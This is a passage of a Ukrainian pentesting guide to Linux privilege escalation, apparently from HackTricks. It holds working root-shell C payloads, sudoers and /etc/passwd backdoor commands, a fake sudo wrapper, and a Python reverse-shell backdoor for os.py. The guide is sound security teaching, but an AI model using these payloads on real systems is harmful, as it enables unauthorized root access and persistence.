> Подібний privesc можна використати, якщо атакувальник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях, у якому шукатимуться бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Якщо виявлено бінарний файл із незвичними **SUID**-дозволами, варто перевірити, чи правильно він завантажує файли **.so**. Це можна перевірити, виконавши наведену нижче команду:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, помилка на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ може свідчити про потенційну можливість експлуатації.

Для цього потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, що міститиме наведений нижче код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код після компіляції та виконання має на меті підвищити привілеї шляхом маніпулювання дозволами файлів і запуску shell із підвищеними привілеями.

Скомпілюйте наведений вище C-файл у shared object-файл (.so) за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск уразливого SUID binary має активувати exploit, що потенційно може призвести до компрометації системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, що завантажує library з папки, до якої ми маємо доступ на запис, створімо library у цій папці з необхідним ім’ям:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку на кшталт
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована вами library повинна мати функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це структурований список Unix binaries, які attacker може використати для обходу локальних security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише інжектити аргументи** в command.

Проєкт містить легітимні функції Unix binaries, якими можна зловживати, щоб вийти з restricted shells, підвищити або зберегти elevated privileges, передавати файли, запускати bind і reverse shells, а також виконувати інші post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, можна використати tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знаходить він спосіб exploit-нути будь-яке sudo rule.

### Reusing Sudo Tokens

У випадках, коли ви маєте **sudo access**, але не маєте password, можна підвищити privileges, **дочекавшись виконання sudo command, а потім перехопивши session token**.<sup>[[18]](#references)</sup>

Requirements для підвищення privileges:

- Ви вже маєте shell від імені user "_sampleuser_"
- "_sampleuser_" **використовував `sudo`**, щоб виконати щось **протягом останніх 15 хвилин** (за замовчуванням це тривалість sudo token, яка дозволяє використовувати `sudo` без повторного введення password)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або назавжди змінити `/etc/sysctl.d/10-ptrace.conf`, встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці requirements виконано, **ви можете підвищити privileges за допомогою:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Перший exploit** (`exploit.sh`) створить binary `activate_sudo_token` у _/tmp_. Ви можете використати його, щоб **активувати sudo token у своїй session** (root shell не буде отримано автоматично, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_, **власником якого є root і для якого встановлено setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить файл sudoers**, який робить **sudo tokens вічними та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** до папки або будь-якого зі створених файлів усередині папки, ви можете використати binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **отримати sudo privileges**, не знаючи пароля, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` і файли всередині `/etc/sudoers.d` налаштовують, хто і як може використовувати `sudo`. За **замовчуванням ці файли можуть читати лише користувач root і група root**.\
**Якщо** ви можете **прочитати** цей файл, то зможете **отримати певну цікаву інформацію**, а якщо ви можете **записати** будь-який файл, то зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви маєте право запису, ви можете зловжити цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ще один спосіб зловживання цими правами доступу:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи binary `sudo`, як-от `doas` для OpenBSD. Не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Якщо `doas` дозволяє редактор або інтерпретатор, перевірте escape-обхід у стилі GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Перехоплення Sudo

Якщо ви знаєте, що **користувач зазвичай підключається до машини та використовує `sudo`** для підвищення привілеїв, і ви отримали shell у контексті цього користувача, можна **створити новий виконуваний файл sudo**, який виконає ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях до .bash_profile), щоб під час виконання користувачем sudo запускався ваш виконуваний файл sudo.

Зверніть увагу: якщо користувач використовує іншу shell (не bash), потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або виконавши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться завантажені файли конфігурації**. Зазвичай цей файл містить такий шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що файли конфігурації з `/etc/ld.so.conf.d/*.conf` буде прочитано. Ці файли конфігурації **вказують на інші папки**, де буде виконуватися **пошук** **бібліотек**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки в `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має дозволи на запис** до будь-якого із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якого файлу всередині `/etc/ld.so.conf.d/` або будь-якої папки, вказаної у файлі конфігурації всередині `/etc/ld.so.conf.d/*.conf`, він може отримати можливість підвищити привілеї.\
Перегляньте **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши бібліотеку до `/var/tmp/flag15/`, ви забезпечите її використання програмою в цьому місці, як указано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть шкідливу бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities надають **процесу підмножину доступних root-привілеїв**. Це фактично розділяє root-**привілеї на менші та відокремлені одиниці**. Кожна з цих одиниць може незалежно надаватися процесам. Таким чином, повний набір привілеїв зменшується, що знижує ризики exploitation.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities і способи їх abuse**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

У directory **bit для "execute"** означає, що відповідний користувач може виконати "**cd**" до folder.\
**bit "read"** означає, що користувач може **перелічувати** **files**, а **bit "write"** означає, що користувач може **видаляти** та **створювати** нові **files**.

## ACLs

Access Control Lists (ACLs) є вторинним рівнем discretionary permissions, здатним **перевизначати традиційні ugo/rwx permissions**. Ці permissions покращують контроль доступу до file або directory, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або не входять до групи. Такий рівень **гранулярності забезпечує точніше керування доступом**. Додаткові відомості наведено [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Надати** користувачу "kali" права на читання та запис для file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACL у системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Прихований ACL backdoor у drop-in-файлах sudoers

Поширена помилкова конфігурація — файл у `/etc/sudoers.d/`, власником якого є root і який має режим `440`, але все ще надає користувачу з низькими привілеями доступ на запис через ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати правило sudo, незважаючи на обмежувальні біти режиму:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Це шлях persistence/privesc через ACL із високим впливом, оскільки його легко пропустити під час перевірок лише за допомогою `ls -l`.

## Open shell sessions

У **старих версіях** ви можете **перехопити** певну **shell**-сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **підключатися** до screen-сесій лише свого **користувача**. Однак ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Перелік screen-сесій**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![перехоплення screen-сесій — розташування сокетів (деякі системи надають один як symlink іншого): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Під’єднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Hijacking сеансів tmux

Це була проблема **старих версій tmux**. Мені не вдалося перехопити сеанс tmux (v2.1), створений root, будучи непривілейованим користувачем.

**Перелік сеансів tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Розташування сокетів (деякі системи надають один як symlink іншого) - hijacking tmux sessions: tmux -S /tmp/dev sess ls List using that socket, you can start a tmux session in that socket...](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL- та SSH-ключі, згенеровані в системах на базі Debian (Ubuntu, Kubuntu тощо) у період із вересня 2006 року до 13 травня 2008 року, можуть бути уражені цією вразливістю.\
Ця вразливість виникає під час створення нового ssh-ключа в таких ОС, оскільки **можливими були лише 32 768 варіантів**. Це означає, що всі варіанти можна обчислити, і, **маючи публічний ssh-ключ, можна знайти відповідний приватний ключ**. Обчислені варіанти можна знайти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Цікаві значення конфігурації SSH

- **PasswordAuthentication:** визначає, чи дозволена автентифікація за паролем. Типове значення — `no`.
- **PubkeyAuthentication:** визначає, чи дозволена автентифікація за допомогою публічного ключа. Типове значення — `yes`.
- **PermitEmptyPasswords**: якщо автентифікація за паролем дозволена, визначає, чи дозволяє сервер входити до облікових записів із порожніми паролями. Типове значення — `no`.

### Файли керування входом

Ці файли впливають на те, хто може входити в систему і як саме:

- **`/etc/nologin`**: якщо файл існує, блокує вхід для користувачів, крім root, і виводить його повідомлення.
- **`/etc/securetty`**: обмежує, звідки root може входити в систему (список дозволених TTY).
- **`/etc/motd`**: банер після входу (може розкрити відомості про середовище або технічне обслуговування).

### PermitRootLogin

Визначає, чи може root входити за допомогою ssh; типове значення — `no`. Можливі значення:

- `yes`: root може входити за допомогою пароля та приватного ключа
- `without-password` або `prohibit-password`: root може входити лише за допомогою приватного ключа
- `forced-commands-only`: root може входити лише за допомогою приватного ключа, і лише якщо вказано параметри команд
- `no` : ні

### AuthorizedKeysFile

Визначає файли, що містять публічні ключі, які можна використовувати для автентифікації користувачів. Файл може містити такі токени, як `%h`, які буде замінено на домашній каталог. **Можна вказувати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вказує, що під час спроби увійти за допомогою **приватного** ключа користувача "**testusername**" ssh порівняє публічний ключ вашого ключа з ключами, розташованими в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Переспрямування SSH-агента дає змогу **використовувати локальні SSH-ключі замість того, щоб залишати ключі** (без passphrase!) на сервері. Отже, ви зможете **перейти** через ssh **на хост**, а звідти **перейти на інший** хост, **використовуючи** **ключ**, розташований на вашому **початковому хості**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` ось так:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` має значення `*`, щоразу, коли користувач переходить на іншу машину, цей хост матиме доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначати** ці **options** і дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** forwarding ssh-agent за допомогою ключового слова `AllowAgentForwarding` (типове значення — allow).

Якщо ви виявите, що Forward Agent налаштований у середовищі, ознайомтеся з наведеною нижче сторінкою, оскільки **ви можете використати це для ескалації привілеїв**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` і файли в `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Отже, якщо ви можете **записувати або змінювати будь-який із них, ви можете виконати ескалацію привілеїв**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь підозрілий profile script, слід перевірити його на наявність **чутливих даних**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` і `/etc/shadow` можуть мати іншу назву або існувати як резервна копія. Тому рекомендується **знайти всі такі файли** та **перевірити, чи можете ви їх прочитати**, щоб з'ясувати, **чи містяться всередині файлів хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі **хеші паролів** `/etc/passwd` (або еквівалентному) можна знайти
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Доступний для запису /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наведених нижче команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і встановіть згенерований пароль.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер можна використовувати команду `su` з `hacker:hacker`

Альтернативно можна використати наведені нижче рядки, щоб додати dummy-користувача без пароля.\
УВАГА: це може знизити поточний рівень безпеки машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На BSD-платформах `/etc/passwd` розташований у `/etc/pwd.db` і `/etc/master.passwd`, а `/etc/shadow` перейменований на `/etc/spwd.db`.

Слід перевірити, чи можете ви **записувати в деякі конфіденційні файли**. Наприклад, чи можете ви записувати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінювати файл конфігурації сервісу Tomcat у /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано під час наступного запуску tomcat.

### Перевірка папок

У таких папках можуть міститися резервні копії або цікава інформація: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/файли, що належать користувачу
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли баз даних Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Ознайомтеся з кодом [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще одним цікавим інструментом**, який можна для цього використовувати, є [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це open source застосунок, призначений для отримання великої кількості паролів, збережених на локальному комп’ютері під керуванням Windows, Linux і Mac.

### Логи

Якщо ви можете читати логи, то, можливо, зможете знайти **цікаву/конфіденційну інформацію всередині них**. Що незвичнішим є лог, то цікавішим він, імовірно, буде.\
Крім того, деякі неправильно налаштовані (із бекдором?) **логи аудиту** можуть дозволити вам **записувати паролі** в логи аудиту, як пояснюється в цьому дописі: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати журнали, група** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Файли Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Пошук Generic Creds/Regex

Також слід перевірити файли, що містять слово "**password**" у своєму **name** або всередині **content**, а також перевірити IP-адреси й email-адреси в логах або regex для хешів.\
Я не буду тут перелічувати, як це все робити, але якщо вас це цікавить, можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Hijacking бібліотеки Python

Якщо ви знаєте, **звідки** буде виконуватися Python-скрипт і **можете записувати всередину** цієї папки або **змінювати бібліотеки Python**, ви можете змінити бібліотеку OS і встановити в неї backdoor (якщо ви можете записувати в місце, де буде виконуватися Python-скрипт, скопіюйте та вставте бібліотеку os.py).

Щоб **встановити backdoor у бібліотеку**, просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація logrotate

Вразливість у `logrotate` дає користувачам із **правами на запис** до log-файлу або його батьківських каталогів потенційну можливість отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто працює від імені **root**, можна змусити виконувати довільні файли, особливо в таких каталогах, як _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, а й у будь-якому каталозі, де застосовується ротація log-файлів.

> [!TIP]
> Ця вразливість впливає на версію `logrotate` `3.18.0` і старіші версії

Докладнішу інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Експлуатувати цю вразливість можна за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(логи nginx),** тому щоразу, коли ви виявляєте можливість змінювати логи, перевіряйте, хто ними керує, і чи можете ви підвищити привілеї, підмінивши логи symlink-посиланнями.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Якщо з будь-якої причини користувач може **записати** скрипт `ifcf-<whatever>` до _/etc/sysconfig/network-scripts_ **або** **змінити** наявний, тоді ваша **система pwned**.<sup>[[20]](#references)</sup>

Мережеві скрипти, наприклад _ifcg-eth0_, використовуються для мережевих підключень. Вони виглядають точно як файли .INI. Однак у Linux Network Manager їх \~sourced\~ (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється некоректно. Якщо в імені є **пробіл, система намагається виконати частину після пробілу**. Це означає, що **все після першого пробілу виконується від імені root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd та rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Він містить скрипти для `start`, `stop`, `restart` і, іноді, `reload` сервісів. Їх можна виконувати безпосередньо або через символічні посилання, розташовані в `/etc/rc?.d/`. Альтернативним шляхом у системах Redhat є `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язаний з **Upstart** — новішою **системою керування сервісами**, представленою Ubuntu, яка використовує конфігураційні файли для завдань керування сервісами. Незважаючи на перехід до Upstart, скрипти SysVinit і надалі використовуються разом із конфігураціями Upstart завдяки шару сумісності в Upstart.

**systemd** є сучасним менеджером ініціалізації та сервісів і пропонує розширені можливості, як-от запуск daemon за потреби, керування automount і створення знімків стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива та в `/etc/systemd/system/` для змін адміністратора, спрощуючи процес адміністрування системи.<sup>[[21]](#references)</sup>

## Інші трюки

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай під'єднуються до syscall, щоб надати userspace manager доступ до привілейованих можливостей kernel. Слабка автентифікація manager (наприклад, перевірки підпису, засновані на порядку FD, або ненадійні password schemes) може дозволити локальному app видати себе за manager і підвищити привілеї до root на пристроях, які вже мають root-доступ. Дізнайтеся більше про це та деталі експлуатації тут:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery у VMware Tools/Aria Operations може вилучити шлях до binary з командних рядків процесів і виконати його з -v у привілейованому контексті. Надто permissive patterns (наприклад, із використанням \S) можуть збігатися зі listeners, розміщеними attacker у writable locations (наприклад, /tmp/httpd), що призводить до виконання від імені root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Дізнайтеся більше та перегляньте узагальнений pattern, придатний для інших discovery/monitoring stacks, тут:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

